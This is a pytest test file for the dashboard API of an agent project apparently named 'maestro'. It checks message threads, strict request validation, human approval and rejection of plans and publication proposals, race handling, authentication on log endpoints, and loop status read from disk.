    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
        r = await c.post("/api/messages", json={
            "content": "Yes, focus on docs",
            "message_type": "answer",
            "reply_to": "abc123",
        })
    assert r.status_code == 200
    assert agent.message_store is not None
    msgs = agent.message_store.get_recent(10)
    assert msgs[0].reply_to == "abc123"
    assert msgs[0].message_type == "answer"


@pytest.mark.asyncio
async def test_message_thread(mem_fs: dict[str, str]) -> None:
    from maestro.messaging import Message

    app, agent = _make_app_with_messages(mem_fs)
    assert agent.message_store is not None
    # Save a question and reply
    agent.message_store.save_message(Message(
        message_id="q1", timestamp="2026-01-01T00:00:00", sender="maestro",
        content="What next?", message_type="question",
    ))
    agent.message_store.save_message(Message(
        message_id="a1", timestamp="2026-01-01T00:01:00", sender="thomas",
        content="Work on docs", message_type="answer", reply_to="q1",
    ))
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
        r = await c.get("/api/messages/q1/thread")
    assert r.status_code == 200
    thread = r.json()
    assert len(thread) == 2
    assert thread[0]["message_id"] == "q1"
    assert thread[1]["message_id"] == "a1"


@pytest.mark.asyncio
async def test_message_thread_no_store(mem_fs: dict[str, str]) -> None:
    app, _ = _make_app(mem_fs)
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
        r = await c.get("/api/messages/xyz/thread")
    assert r.status_code == 200
    assert r.json() == []


@pytest.mark.asyncio
async def test_post_message_default_type(mem_fs: dict[str, str]) -> None:
    """When message_type is omitted, defaults to 'instruction'."""
    app, agent = _make_app_with_messages(mem_fs)
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
        r = await c.post("/api/messages", json={"content": "do something"})
    assert r.status_code == 200
    assert agent.message_store is not None
    msgs = agent.message_store.get_recent(10)
    assert msgs[0].message_type == "instruction"


@pytest.mark.asyncio
async def test_post_message_non_dict_body(mem_fs: dict[str, str]) -> None:
    """Sending a JSON array instead of object should return 400."""
    app, _ = _make_app_with_messages(mem_fs)
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
        r = await c.post("/api/messages", json=["not", "a", "dict"])
    assert r.status_code == 400


@pytest.mark.asyncio
async def test_post_message_unknown_field_rejected(mem_fs: dict[str, str]) -> None:
    """extra="forbid" (proposal 022): unknown body fields are a 400."""
    app, agent = _make_app_with_messages(mem_fs)
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
        r = await c.post("/api/messages", json={
            "content": "hello", "sender": "maestro",
        })
    assert r.status_code == 400
    assert "sender" in r.json()["error"]
    assert agent.message_store is not None
    assert agent.message_store.get_recent(10) == []


@pytest.mark.asyncio
async def test_post_message_non_string_content_rejected(
    mem_fs: dict[str, str],
) -> None:
    """Strict schema (022): content must be a string, not coerced via str()."""
    app, _ = _make_app_with_messages(mem_fs)
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
        r = await c.post("/api/messages", json={"content": 123})
    assert r.status_code == 400
    assert "content" in r.json()["error"]


@pytest.mark.asyncio
async def test_post_message_non_string_reply_to_rejected(
    mem_fs: dict[str, str],
) -> None:
    """Strict schema (022): reply_to must be a string or null."""
    app, _ = _make_app_with_messages(mem_fs)
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
        r = await c.post("/api/messages", json={
            "content": "hello", "reply_to": 5,
        })
    assert r.status_code == 400
    assert "reply_to" in r.json()["error"]


@pytest.mark.asyncio
async def test_post_message_content_clamped_to_max_length(
    mem_fs: dict[str, str],
) -> None:
    """Strict schema keeps the message_max_length clamp (proposal 022)."""
    app, agent = _make_app_with_messages(mem_fs)
    max_len = agent.config.message_max_length
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
        r = await c.post("/api/messages", json={"content": "x" * (max_len + 100)})
    assert r.status_code == 200
    assert agent.message_store is not None
    msgs = agent.message_store.get_recent(10)
    assert len(msgs) == 1
    assert len(msgs[0].content) == max_len


@pytest.mark.asyncio
async def test_reject_plan_action_not_pending(mem_fs: dict[str, str]) -> None:
    """reject_plan_action raises PlanNotPendingError if plan is not pending."""
    from maestro.dashboard.routes import PlanNotPendingError, reject_plan_action

    _, agent = _make_app(mem_fs)
    agent.memory.save_evolution_plan(EvolutionPlan(
        plan_id="pr_done", title="Already Approved",
        category="capability", rationale="test", proposed_changes=[],
        files_affected=[], expected_impact="",
        status="approved",
        created_at="2025-01-01T00:00:00Z",
    ))
    with pytest.raises(PlanNotPendingError):
        await reject_plan_action(agent, "pr_done", "reason", "x")


@pytest.mark.asyncio
async def test_reject_plan_endpoint_not_found(mem_fs: dict[str, str]) -> None:
    """POST /api/plans/{id}/reject returns 404 if plan doesn't exist."""
    app, _ = _make_app(mem_fs)
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
        r = await c.post(
            "/api/plans/nonexistent/reject",
            json={"reason": "no", "content_hash": "x"},
        )
    assert r.status_code == 404


@pytest.mark.asyncio
async def test_reject_plan_unknown_id_short_circuits_before_body_read(
    mem_fs: dict[str, str],
) -> None:
    """reject returns 404 for an unknown plan id without awaiting request.json().

    The fast-path must short-circuit before the request body is consumed,
    mirroring approve_plan / plan_detail. A spy on ``Request.json`` flips a
    flag when the body is read; it must stay unset for an unknown id.
    """
    app, _ = _make_app(mem_fs)

    import starlette.requests
    original_json = starlette.requests.Request.json
    awaited = False

    async def spy_json(self: starlette.requests.Request) -> object:
        nonlocal awaited
        if "unknownid" in str(self.url):
            awaited = True
        return await original_json(self)

    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
        with patch.object(starlette.requests.Request, "json", spy_json):
            r = await c.post(
                "/api/plans/unknownid/reject",
                json={"reason": "no", "content_hash": "x"},
            )
    assert r.status_code == 404
    assert awaited is False


@pytest.mark.asyncio
async def test_reject_plan_resolved_id_short_circuits_before_body_read(
    mem_fs: dict[str, str],
) -> None:
    """reject returns 400 for an already-resolved plan without awaiting request.json().

    An approved (non-pending) plan is caught by the same pre-body fast-path,
    so the spy on ``Request.json`` never fires.
    """
    app, agent = _make_app(mem_fs)
    agent.memory.save_evolution_plan(EvolutionPlan(
        plan_id="presolved", title="Already Approved",
        category="capability", rationale="test", proposed_changes=[],
        files_affected=[], expected_impact="",
        status="approved",
        created_at="2025-01-01T00:00:00Z",
    ))

    import starlette.requests
    original_json = starlette.requests.Request.json
    awaited = False

    async def spy_json(self: starlette.requests.Request) -> object:
        nonlocal awaited
        if "presolved" in str(self.url):
            awaited = True
        return await original_json(self)

    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
        with patch.object(starlette.requests.Request, "json", spy_json):
            r = await c.post(
                "/api/plans/presolved/reject",
                json={"reason": "no", "content_hash": "x"},
            )
    assert r.status_code == 400
    assert awaited is False


@pytest.mark.asyncio
async def test_reject_plan_endpoint_non_dict_body(mem_fs: dict[str, str]) -> None:
    """POST /api/plans/{id}/reject with non-dict JSON body returns 400
    (manual strict validation, proposal 022)."""
    app, agent = _make_app(mem_fs)
    agent.memory.save_evolution_plan(EvolutionPlan(
        plan_id="prnd", title="Non Dict",
        category="capability", rationale="test", proposed_changes=[],
        files_affected=[], expected_impact="",
        created_at="2025-01-01T00:00:00Z",
    ))
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
        r = await c.post("/api/plans/prnd/reject", json=["not", "a", "dict"])
    assert r.status_code == 400


@pytest.mark.asyncio
async def test_sdk_session_detail_not_found(mem_fs: dict[str, str]) -> None:
    """GET /api/logs/sdk-sessions/{date}/{filename} returns 404 when file not found."""
    app, _ = _make_app(mem_fs)
    with patch("maestro.logs.read_transcript_detail", return_value=None):
        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
            r = await c.get("/api/logs/sdk-sessions/2026-01-01/nonexistent.log")
    assert r.status_code == 404
    assert r.json()["error"] == "Not found"


@pytest.mark.asyncio
async def test_sdk_session_detail_found(mem_fs: dict[str, str]) -> None:
    """GET /api/logs/sdk-sessions/{date}/{filename} returns the reader's legacy blob for a .log."""
    app, _ = _make_app(mem_fs)
    legacy = {
        "caller": None,
        "session_id": None,
        "started_at": None,
        "session_label": None,
        "iteration": None,
        "task_id": None,
        "content": "log content here",
        "legacy": True,
    }
    with patch("maestro.logs.read_transcript_detail", return_value=legacy):
        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
            r = await c.get("/api/logs/sdk-sessions/2026-01-01/test.log")
    assert r.status_code == 200
    data = r.json()
    assert data["content"] == "log content here"
    assert data["legacy"] is True
    assert data["caller"] is None


@pytest.mark.asyncio
async def test_sdk_sessions_surfaces_provenance(mem_fs: dict[str, str]) -> None:
    """GET /api/logs/sdk-sessions surfaces stamped provenance and legacy-null rows."""
    app, _ = _make_app(mem_fs)
    rows = [
        {
            "date": "2026-01-02",
            "filename": "10-00-00_contemplate_abc.jsonl",
            "size_bytes": 2048,
            "phase": "contemplate",
            "session": "session-a",
            "iteration": 42,
            "task": "task-7",
            "turn_count": 5,
            "started_at": "2026-01-02T10:00:00Z",
            "session_id": "sid-1",
        },
        {
            "date": "2026-01-01",
            "filename": "09-00-00_legacy.log",
            "size_bytes": 512,
            "phase": None,
            "session": None,
            "iteration": None,
            "task": None,
            "turn_count": None,
            "started_at": None,
            "session_id": None,
        },
    ]
    with patch("maestro.logs.read_transcript_summaries", return_value=rows):
        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
            r = await c.get("/api/logs/sdk-sessions")
    assert r.status_code == 200
    data = r.json()
    assert len(data) == 2
    stamped, legacy = data[0], data[1]
    assert stamped["phase"] == "contemplate"
    assert stamped["session"] == "session-a"
    assert stamped["iteration"] == 42
    assert stamped["task"] == "task-7"
    assert legacy["phase"] is None
    assert legacy["session"] is None
    assert legacy["iteration"] is None
    assert legacy["task"] is None


@pytest.mark.asyncio
async def test_sdk_session_detail_returns_typed_turns(mem_fs: dict[str, str]) -> None:
    """GET /api/logs/sdk-sessions/{date}/{filename} returns typed turns for a stamped sidecar."""
    app, _ = _make_app(mem_fs)
    parsed = {
        "caller": "contemplate",
        "session_id": "sid-1",
        "started_at": "2026-01-02T10:00:00Z",
        "session_label": "session-a",
        "iteration": 42,
        "task_id": "task-7",
        "turns": [
            {"kind": "thinking", "role": "assistant",
             "ts": "2026-01-02T10:00:01Z", "content": "weighing options"},
            {"kind": "text", "role": "assistant",
             "ts": "2026-01-02T10:00:02Z", "content": "hello"},
        ],
        "legacy": False,
    }
    with patch("maestro.logs.read_transcript_detail", return_value=parsed):
        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
            r = await c.get(
                "/api/logs/sdk-sessions/2026-01-02/10-00-00_contemplate_abc.jsonl",
            )
    assert r.status_code == 200
    data = r.json()
    assert data["legacy"] is False
    assert data["caller"] == "contemplate"
    assert len(data["turns"]) == 2
    assert data["turns"][1]["kind"] == "text"
    assert data["turns"][1]["content"] == "hello"


def test_sdk_session_endpoints_stay_behind_auth() -> None:
    """Neither SDK-session endpoint is in the public allowlist — both require auth."""
    from maestro.dashboard.auth import _PUBLIC_PATHS, _PUBLIC_PREFIXES

    list_path = "/api/logs/sdk-sessions"
    detail_path = "/api/logs/sdk-sessions/2026-01-02/10-00-00_contemplate_abc.jsonl"
    for path in (list_path, detail_path):
        assert path not in _PUBLIC_PATHS
        assert not any(path.startswith(prefix) for prefix in _PUBLIC_PREFIXES)


@pytest.mark.asyncio
async def test_get_messages_with_count(mem_fs: dict[str, str]) -> None:
    from maestro.messaging import Message

    app, agent = _make_app_with_messages(mem_fs)
    assert agent.message_store is not None
    for i in range(5):
        agent.message_store.save_message(Message(
            message_id=f"m{i}", timestamp="2026-01-01T00:00:00",
            sender="thomas", content=f"msg {i}", message_type="info",
        ))
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
        r = await c.get("/api/messages?n=2")
    assert r.status_code == 200
    assert len(r.json()) == 2


# ---------------------------------------------------------------------------
# Proposal 032 — publication proposal endpoints
# ---------------------------------------------------------------------------


def _make_proposal_row(
    agent,  # type: ignore[no-untyped-def]
    *,
    proposal_id: str = "prop-1",
    status: str = "pending_approval",
    proposed_name: str = "cool-thing",
    review_id: str = "rev-1",
    task_id: str = "task-1",
) -> None:
    from maestro.memory import PublicationProposal
    agent.memory.write_publication_proposal(PublicationProposal(
        proposal_id=proposal_id,
        task_id=task_id,
        review_id=review_id,
        proposed_name=proposed_name,
        description="A cool thing",
        proposed_readme="# readme\n\nBody.",
        publishable_files=["README.md"],
        status=status,  # type: ignore[arg-type]
        created_at="2026-04-24T00:00:00+00:00",
    ))


@pytest.mark.asyncio
async def test_approve_publication_endpoint_success(
    mem_fs: dict[str, str],
) -> None:
    app, agent = _make_app(mem_fs)
    _make_proposal_row(agent, proposal_id="p-ok")
    async with AsyncClient(
        transport=ASGITransport(app=app), base_url="http://test",
    ) as c:
        r = await c.post("/api/publications/p-ok/approve")
    assert r.status_code == 200
    assert r.json()["status"] == "approved"
    updated = agent.memory.get_proposal("p-ok")
    assert updated is not None and updated.status == "approved"
    assert updated.reviewed_at is not None


@pytest.mark.asyncio
async def test_approve_publication_endpoint_not_found(
    mem_fs: dict[str, str],
) -> None:
    app, _ = _make_app(mem_fs)
    async with AsyncClient(
        transport=ASGITransport(app=app), base_url="http://test",
    ) as c:
        r = await c.post("/api/publications/missing/approve")
    assert r.status_code == 404


@pytest.mark.asyncio
async def test_approve_publication_endpoint_not_pending(
    mem_fs: dict[str, str],
) -> None:
    app, agent = _make_app(mem_fs)
    _make_proposal_row(agent, proposal_id="p-rej", status="rejected")
    async with AsyncClient(
        transport=ASGITransport(app=app), base_url="http://test",
    ) as c:
        r = await c.post("/api/publications/p-rej/approve")
    assert r.status_code == 400
    assert "not pending" in r.json()["error"].lower()


@pytest.mark.asyncio
async def test_reject_publication_endpoint_success(
    mem_fs: dict[str, str],
) -> None:
    app, agent = _make_app(mem_fs)
    _make_proposal_row(agent, proposal_id="p-rej")
    async with AsyncClient(
        transport=ASGITransport(app=app), base_url="http://test",
    ) as c:
        r = await c.post(
            "/api/publications/p-rej/reject",
            json={"reason": "not ready for public consumption"},
        )
    assert r.status_code == 200
    updated = agent.memory.get_proposal("p-rej")
    assert updated is not None and updated.status == "rejected"
    assert updated.rejection_reason == "not ready for public consumption"


@pytest.mark.asyncio
async def test_reject_publication_endpoint_missing_reason_defaults(
    mem_fs: dict[str, str],
) -> None:
    """Empty JSON body falls back to default rejection reason."""
    app, agent = _make_app(mem_fs)
    _make_proposal_row(agent, proposal_id="p-def")
    async with AsyncClient(
        transport=ASGITransport(app=app), base_url="http://test",
    ) as c:
        r = await c.post("/api/publications/p-def/reject", json={})
    assert r.status_code == 200
    updated = agent.memory.get_proposal("p-def")
    assert updated is not None
    assert updated.rejection_reason == "No reason provided"


@pytest.mark.asyncio
async def test_reject_publication_endpoint_empty_reason_defaults(
    mem_fs: dict[str, str],
) -> None:
    """An empty-string reason must fall back to the default placeholder."""
    app, agent = _make_app(mem_fs)
    _make_proposal_row(agent, proposal_id="p-empty")
    async with AsyncClient(
        transport=ASGITransport(app=app), base_url="http://test",
    ) as c:
        r = await c.post(
            "/api/publications/p-empty/reject",
            json={"reason": ""},
        )
    assert r.status_code == 200
    updated = agent.memory.get_proposal("p-empty")
    assert updated is not None
    assert updated.rejection_reason == "No reason provided"


@pytest.mark.asyncio
async def test_reject_publication_endpoint_whitespace_reason_defaults(
    mem_fs: dict[str, str],
) -> None:
    """A whitespace-only reason must fall back to the default placeholder."""
    app, agent = _make_app(mem_fs)
    _make_proposal_row(agent, proposal_id="p-ws")
    async with AsyncClient(
        transport=ASGITransport(app=app), base_url="http://test",
    ) as c:
        r = await c.post(
            "/api/publications/p-ws/reject",
            json={"reason": "   "},
        )
    assert r.status_code == 200
    updated = agent.memory.get_proposal("p-ws")
    assert updated is not None
    assert updated.rejection_reason == "No reason provided"


@pytest.mark.asyncio
async def test_reject_publication_endpoint_non_string_reason_rejected(
    mem_fs: dict[str, str],
) -> None:
    """A non-string reason is a 400 under the strict schema (proposal 022)."""
    app, agent = _make_app(mem_fs)
    _make_proposal_row(agent, proposal_id="p-num")
    async with AsyncClient(
        transport=ASGITransport(app=app), base_url="http://test",
    ) as c:
        r = await c.post(
            "/api/publications/p-num/reject",
            json={"reason": 42},
        )
    assert r.status_code == 400
    assert "reason" in r.json()["error"]
    updated = agent.memory.get_proposal("p-num")
    assert updated is not None
    assert updated.status == "pending_approval"


@pytest.mark.asyncio
async def test_reject_publication_endpoint_unknown_field_rejected(
    mem_fs: dict[str, str],
) -> None:
    """extra="forbid": unknown body fields are a 400, not silently dropped."""
    app, agent = _make_app(mem_fs)
    _make_proposal_row(agent, proposal_id="p-extra")
    async with AsyncClient(
        transport=ASGITransport(app=app), base_url="http://test",
    ) as c:
        r = await c.post(
            "/api/publications/p-extra/reject",
            json={"reason": "fine", "status": "approved"},
        )
    assert r.status_code == 400
    assert "status" in r.json()["error"]
    updated = agent.memory.get_proposal("p-extra")
    assert updated is not None
    assert updated.status == "pending_approval"


@pytest.mark.asyncio
async def test_reject_publication_endpoint_invalid_json(
    mem_fs: dict[str, str],
) -> None:
    app, agent = _make_app(mem_fs)
    _make_proposal_row(agent, proposal_id="p-bad")
    async with AsyncClient(
        transport=ASGITransport(app=app), base_url="http://test",
    ) as c:
        r = await c.post(
            "/api/publications/p-bad/reject", content="not json",
        )
    assert r.status_code == 400


@pytest.mark.asyncio
async def test_publications_list_filters_by_status(
    mem_fs: dict[str, str],
) -> None:
    app, agent = _make_app(mem_fs)
    _make_proposal_row(agent, proposal_id="p-a", status="pending_approval")
    _make_proposal_row(agent, proposal_id="p-b", status="approved")
    _make_proposal_row(agent, proposal_id="p-c", status="rejected")
    async with AsyncClient(
        transport=ASGITransport(app=app), base_url="http://test",
    ) as c:
        r = await c.get("/api/publications?status=approved")
    assert r.status_code == 200
    rows = r.json()
    assert len(rows) == 1
    assert rows[0]["proposal_id"] == "p-b"


@pytest.mark.asyncio
async def test_publications_list_rejects_unknown_status(
    mem_fs: dict[str, str],
) -> None:
    app, _ = _make_app(mem_fs)
    async with AsyncClient(
        transport=ASGITransport(app=app), base_url="http://test",
    ) as c:
        r = await c.get("/api/publications?status=bogus")
    assert r.status_code == 400


@pytest.mark.asyncio
async def test_publication_detail_returns_row(
    mem_fs: dict[str, str],
) -> None:
    app, agent = _make_app(mem_fs)
    _make_proposal_row(agent, proposal_id="p-detail")
    async with AsyncClient(
        transport=ASGITransport(app=app), base_url="http://test",
    ) as c:
        r = await c.get("/api/publications/p-detail")
    assert r.status_code == 200
    assert r.json()["proposal_id"] == "p-detail"


@pytest.mark.asyncio
async def test_publication_detail_not_found(
    mem_fs: dict[str, str],
) -> None:
    app, _ = _make_app(mem_fs)
    async with AsyncClient(
        transport=ASGITransport(app=app), base_url="http://test",
    ) as c:
        r = await c.get("/api/publications/missing")
    assert r.status_code == 404


@pytest.mark.asyncio
async def test_artifact_reviews_endpoint_returns_tail(
    mem_fs: dict[str, str],
) -> None:
    app, agent = _make_app(mem_fs)
    from maestro.memory import ArtifactReview
    for i in range(3):
        agent.memory.write_artifact_review(ArtifactReview(
            review_id=f"r{i}", task_id=f"t{i}", verdict="publish",
            title=f"t{i}", reasoning="r",
            bundle_file_names=["README.md"],
            proposed_name=f"n{i}", proposed_description="d",
            timestamp=f"2026-04-0{i + 1}T00:00:00+00:00",
        ))
    async with AsyncClient(
        transport=ASGITransport(app=app), base_url="http://test",
    ) as c:
        r = await c.get("/api/artifact-reviews?n=2")
    assert r.status_code == 200
    rows = r.json()
    assert len(rows) == 2
    assert rows[-1]["review_id"] == "r2"


def test_approve_publication_action_not_found(mem_fs: dict[str, str]) -> None:
    from maestro.dashboard.routes import (
        PublicationNotFoundError,
        approve_publication_action,
    )
    _, agent = _make_app(mem_fs)
    with pytest.raises(PublicationNotFoundError):
        approve_publication_action(agent, "nope")


def test_approve_publication_action_not_pending(
    mem_fs: dict[str, str],
) -> None:
    from maestro.dashboard.routes import (
        PublicationNotPendingError,
        approve_publication_action,
    )
    _, agent = _make_app(mem_fs)
    _make_proposal_row(agent, proposal_id="p-a", status="approved")
    with pytest.raises(PublicationNotPendingError):
        approve_publication_action(agent, "p-a")


def test_approve_publication_action_vanished_raises_not_found(
    mem_fs: dict[str, str],
) -> None:
    """update_proposal_status False + re-fetch None → PublicationNotFoundError."""
    from maestro.dashboard.routes import (
        PublicationNotFoundError,
        approve_publication_action,
    )
    _, agent = _make_app(mem_fs)
    _make_proposal_row(agent, proposal_id="p-vanish")
    real_get = agent.memory.get_proposal
    call_count = {"n": 0}

    def vanishing_get(proposal_id: str) -> Any:
        call_count["n"] += 1
        # First call (status check) sees the row; second (after False
        # update) sees nothing — the row was deleted by another process.
        if call_count["n"] == 1:
            return real_get(proposal_id)
        return None

    with (
        patch.object(
            agent.memory, "update_proposal_status", return_value=False,
        ),
        patch.object(
            agent.memory, "get_proposal", side_effect=vanishing_get,
        ),
        pytest.raises(PublicationNotFoundError),
    ):
        approve_publication_action(agent, "p-vanish")


def test_approve_publication_action_loses_race_raises_not_pending(
    mem_fs: dict[str, str],
) -> None:
    """Concurrent surface resolves the proposal between the action's
    status check and its update — the lock-checked update returns False
    and the action surfaces ``PublicationNotPendingError``."""
    from maestro.dashboard.routes import (
        PublicationNotPendingError,
        approve_publication_action,
    )
    _, agent = _make_app(mem_fs)
    _make_proposal_row(agent, proposal_id="p-race")

    real_update = agent.memory.update_proposal_status
    call_count = {"n": 0}

    def racy_update(*args: Any, **kwargs: Any) -> bool:
        call_count["n"] += 1
        if call_count["n"] == 1:
            # Simulate a concurrent surface resolving first.
            real_update(
                "p-race", "rejected",
                rejection_reason="raced by Telegram",
                reviewed_at="2026-04-25T00:00:00+00:00",
            )
        return real_update(*args, **kwargs)

    with (
        patch.object(
            agent.memory, "update_proposal_status", side_effect=racy_update,
        ),
        pytest.raises(PublicationNotPendingError),
    ):
        approve_publication_action(agent, "p-race")
    # The race winner's state is preserved verbatim.
    p = agent.memory.get_proposal("p-race")
    assert p is not None
    assert p.status == "rejected"
    assert p.rejection_reason == "raced by Telegram"


def test_reject_publication_action_success(mem_fs: dict[str, str]) -> None:
    from maestro.dashboard.routes import reject_publication_action
    _, agent = _make_app(mem_fs)
    _make_proposal_row(agent, proposal_id="p-reject-sync")
    result = reject_publication_action(
        agent, "p-reject-sync", "not ready",
    )
    assert result == "rejected"
    updated = agent.memory.get_proposal("p-reject-sync")
    assert updated is not None and updated.status == "rejected"
    assert updated.rejection_reason == "not ready"


def test_reject_publication_action_not_found(mem_fs: dict[str, str]) -> None:
    from maestro.dashboard.routes import (
        PublicationNotFoundError,
        reject_publication_action,
    )
    _, agent = _make_app(mem_fs)
    with pytest.raises(PublicationNotFoundError):
        reject_publication_action(agent, "never", "because")


def test_reject_publication_action_not_pending(
    mem_fs: dict[str, str],
) -> None:
    from maestro.dashboard.routes import (
        PublicationNotPendingError,
        reject_publication_action,
    )
    _, agent = _make_app(mem_fs)
    _make_proposal_row(agent, proposal_id="p-nope", status="approved")
    with pytest.raises(PublicationNotPendingError):
        reject_publication_action(agent, "p-nope", "because")


def test_reject_publication_action_vanished_raises_not_found(
    mem_fs: dict[str, str],
) -> None:
    from maestro.dashboard.routes import (
        PublicationNotFoundError,
        reject_publication_action,
    )
    _, agent = _make_app(mem_fs)
    _make_proposal_row(agent, proposal_id="p-vanish-r")
    real_get = agent.memory.get_proposal
    call_count = {"n": 0}

    def vanishing_get(proposal_id: str) -> Any:
        call_count["n"] += 1
        if call_count["n"] == 1:
            return real_get(proposal_id)
        return None

    with (
        patch.object(
            agent.memory, "update_proposal_status", return_value=False,
        ),
        patch.object(
            agent.memory, "get_proposal", side_effect=vanishing_get,
        ),
        pytest.raises(PublicationNotFoundError),
    ):
        reject_publication_action(agent, "p-vanish-r", "because")


def test_reject_publication_action_loses_race_raises_not_pending(
    mem_fs: dict[str, str],
) -> None:
    from maestro.dashboard.routes import (
        PublicationNotPendingError,
        reject_publication_action,
    )
    _, agent = _make_app(mem_fs)
    _make_proposal_row(agent, proposal_id="p-race-r")

    real_update = agent.memory.update_proposal_status
    call_count = {"n": 0}

    def racy_update(*args: Any, **kwargs: Any) -> bool:
        call_count["n"] += 1
        if call_count["n"] == 1:
            real_update(
                "p-race-r", "approved",
                reviewed_at="2026-04-25T00:00:00+00:00",
            )
        return real_update(*args, **kwargs)

    with (
        patch.object(
            agent.memory, "update_proposal_status", side_effect=racy_update,
        ),
        pytest.raises(PublicationNotPendingError),
    ):
        reject_publication_action(agent, "p-race-r", "because")
    p = agent.memory.get_proposal("p-race-r")
    assert p is not None and p.status == "approved"
    # The race-loser's rejection_reason did not stick.
    assert p.rejection_reason is None


@pytest.mark.asyncio
async def test_publications_list_n_param_tails_in_append_order(
    mem_fs: dict[str, str],
) -> None:
    """``?n=2`` tails to the last N proposals in file append order (newest last)."""
    app, agent = _make_app(mem_fs)
    # Three proposals, strictly increasing created_at.
    for idx in range(3):
        from maestro.memory import PublicationProposal
        agent.memory.write_publication_proposal(PublicationProposal(
            proposal_id=f"p-{idx}",
            task_id=f"t-{idx}",
            review_id=f"r-{idx}",
            proposed_name=f"name-{idx}",
            description="",
            proposed_readme=None,
            publishable_files=[],
            status="pending_approval",
            created_at=f"2026-04-2{idx + 1}T00:00:00+00:00",
        ))
    async with AsyncClient(
        transport=ASGITransport(app=app), base_url="http://test",
    ) as c:
        r = await c.get("/api/publications?n=2")
    assert r.status_code == 200
    rows = r.json()
    assert [row["proposal_id"] for row in rows] == ["p-1", "p-2"]


@pytest.mark.asyncio
async def test_publications_list_ordering_consistent_with_or_without_n(
    mem_fs: dict[str, str],
) -> None:
    """Whether `n` is passed or not, ordering is file append order (newest last)."""
    app, agent = _make_app(mem_fs)
    from maestro.memory import PublicationProposal
    for idx in range(3):
        agent.memory.write_publication_proposal(PublicationProposal(
            proposal_id=f"p-{idx}",
            task_id=f"t-{idx}",
            review_id=f"r-{idx}",
            proposed_name=f"name-{idx}",
            description="",
            proposed_readme=None,
            publishable_files=[],
            status="pending_approval",
            created_at=f"2026-04-2{idx + 1}T00:00:00+00:00",
        ))
    async with AsyncClient(
        transport=ASGITransport(app=app), base_url="http://test",
    ) as c:
        full = await c.get("/api/publications")
        tail = await c.get("/api/publications?n=2")
    assert full.status_code == 200
    assert tail.status_code == 200
    full_ids = [row["proposal_id"] for row in full.json()]
    tail_ids = [row["proposal_id"] for row in tail.json()]
    assert full_ids == ["p-0", "p-1", "p-2"]
    assert tail_ids == full_ids[-2:]


@pytest.mark.asyncio
async def test_reject_publication_endpoint_non_dict_body(
    mem_fs: dict[str, str],
) -> None:
    """A non-dict JSON body (e.g. bare array) is rejected with 400."""
    app, agent = _make_app(mem_fs)
    _make_proposal_row(agent, proposal_id="p-arr")
    async with AsyncClient(
        transport=ASGITransport(app=app), base_url="http://test",
    ) as c:
        r = await c.post(
            "/api/publications/p-arr/reject",
            content='["nope"]',
            headers={"Content-Type": "application/json"},
        )
    assert r.status_code == 400


@pytest.mark.asyncio
async def test_reject_publication_endpoint_not_found(
    mem_fs: dict[str, str],
) -> None:
    app, _ = _make_app(mem_fs)
    async with AsyncClient(
        transport=ASGITransport(app=app), base_url="http://test",
    ) as c:
        r = await c.post(
            "/api/publications/missing/reject", json={"reason": "x"},
        )
    assert r.status_code == 404


@pytest.mark.asyncio
async def test_reject_publication_endpoint_not_pending(
    mem_fs: dict[str, str],
) -> None:
    app, agent = _make_app(mem_fs)
    _make_proposal_row(
        agent, proposal_id="p-already", status="rejected",
    )
    async with AsyncClient(
        transport=ASGITransport(app=app), base_url="http://test",
    ) as c:
        r = await c.post(
            "/api/publications/p-already/reject",
            json={"reason": "doubling up"},
        )
    assert r.status_code == 400


# ---------------------------------------------------------------------------
# Loop runtime read from shared disk (#4075): the serve-side agent never runs
# ``run_loop``, so its in-memory loop state stays at ``__init__`` defaults.
# ---------------------------------------------------------------------------

_THROTTLE_ISO = "2026-09-26T12:00:00+00:00"


def _seed_live_loop(
    mem_fs: dict[str, str],
    *,
    heartbeat_age_seconds: float | None = 0.0,
    lifecycle: str | None = None,
    maintenance: str | None = None,
) -> Config:
    config = Config(memory_dir=FAKE_DIR, workspace=FAKE_DIR)
    if heartbeat_age_seconds is not None:
        ts = datetime.now(UTC) - timedelta(seconds=heartbeat_age_seconds)
        mem_fs[str(FAKE_DIR / "loop.heartbeat")] = ts.isoformat()
    if lifecycle is not None:
        mem_fs[str(config.lifecycle_path)] = lifecycle
    if maintenance is not None:
        mem_fs[str(config.maintenance_state_path)] = maintenance
    return config


_LIVE_LIFECYCLE = json.dumps({
    "current_phase": "run_task",
    "budget_throttle_entered_at": _THROTTLE_ISO,
})


@pytest.mark.asyncio
async def test_status_reads_live_loop_from_shared_disk(
    mem_fs: dict[str, str],
) -> None:
    app, agent = _make_app(mem_fs)
    _seed_live_loop(mem_fs, lifecycle=_LIVE_LIFECYCLE)
    assert agent.is_running is False
    async with AsyncClient(
        transport=ASGITransport(app=app), base_url="http://test",
    ) as client:
        r = await client.get("/api/status")
    body = r.json()
    assert body["running"] is True
    assert body["current_task"] == "run_task"


@pytest.mark.asyncio
async def test_diagnostics_throttle_and_maintenance_read_shared_disk(
    mem_fs: dict[str, str],
) -> None:
    app, agent = _make_app(mem_fs)
    _seed_live_loop(
        mem_fs, lifecycle=_LIVE_LIFECYCLE, maintenance='{"active": true}',
    )
    assert agent.budget_throttle_active is False
    async with AsyncClient(
        transport=ASGITransport(app=app), base_url="http://test",
    ) as client:
        r = await client.get("/api/diagnostics")
    body = r.json()
    assert body["budget_throttle_active"] is True
    assert body["budget_throttle_entered_at"] == _THROTTLE_ISO
    assert body["maintenance_mode_active"] is True


